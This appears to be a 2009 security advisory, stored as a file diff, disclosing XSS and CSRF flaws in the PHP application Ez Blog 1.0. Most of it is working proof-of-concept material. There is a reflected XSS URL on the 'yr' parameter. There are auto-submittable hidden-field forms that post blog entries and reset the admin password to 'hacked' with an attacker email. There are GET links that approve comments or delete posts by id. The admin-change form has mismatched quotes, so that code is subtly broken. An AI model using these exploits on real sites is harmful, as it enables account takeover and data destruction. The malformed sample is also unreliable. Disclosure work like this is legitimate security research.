@@ -1,0 +1,69 @@
+[#-----------------------------------------------------------------------------------------------#]
+[#] Title: Ez Blog (XSS/XSRF) Multiple Vulnerabilities
+[#] Author: Milos Zivanovic
+[#] Email: milosz.security[at]gmail.com
+[#] Date: 15. December 2009.
+[#-----------------------------------------------------------------------------------------------#]
+[#] Application: Ez Blog
+[#] Version: 1.0
+[#] Platform: PHP
+[#] Link: link:http://www.scriptsez.net/?action=details&cat=Content%20Management&id=2579678051
+[#] Price: 15 USD
+[#] Vulnerability: XSS And Multiple XSRF Vulnerabilities
+[#-----------------------------------------------------------------------------------------------#]
+
+[#]Content
+ |--XSS in front end
+ |--Admin panel
+    |--Add blog
+    |--Approve comment by id
+    |--Change admin info
+    |--Remove blog by id
+
+[-]XSS in front end
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/ez_blog/index.php?act=bmonth&m=12&yr=[XSS]
+http://localhost/ez_blog/index.php?act=bmonth&m=12&yr=
+[POC----------------------------------------------------------------------------------------------]
+
+[#]Admin panel
+
+[-]Add blog
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/ez_blog/admin.php?action=add_blog" method="post">
+  <input type="hidden" name="title" value="blog title">
+  <input type="hidden" name="content" value="this is my content">
+  <input type="hidden" name="category" value="General">
+  <input type="hidden" name="send" value="true">
+  <input type="submit" name="submit" value=" Add Blog ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[-]Approve comment by id
+
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/ez_blog/admin.php?action=approve_comment&id=[ID]&do=add
+[POC----------------------------------------------------------------------------------------------]
+
+[*]Change admin info
+
+[EXPLOIT------------------------------------------------------------------------------------------]
+<form action="http://localhost/ez_blog/admin.php?action=admin_opt"
+method="post">
+  <input type="hidden" name="login_id" value="admin">
+  <input type="hidden" name="admin_password' value="hacked">
+  <input type="hidden" name="admin_email' value="my@email.com">
+  <input type="hidden" name="blogger' value="Administrator">
+  <input type="hidden" name="auto value="Yes">
+  <input type="hidden" name="add value="true">
+  <input type="submit" name="submit" value=" CHANGE ">
+</form>
+[EXPLOIT------------------------------------------------------------------------------------------]
+
+[-]Remove blog by id:
+[POC----------------------------------------------------------------------------------------------]
+http://localhost/ez_blog/admin.php?action=delete&id=[ID]
+[POC----------------------------------------------------------------------------------------------]
+
+[#]EOF
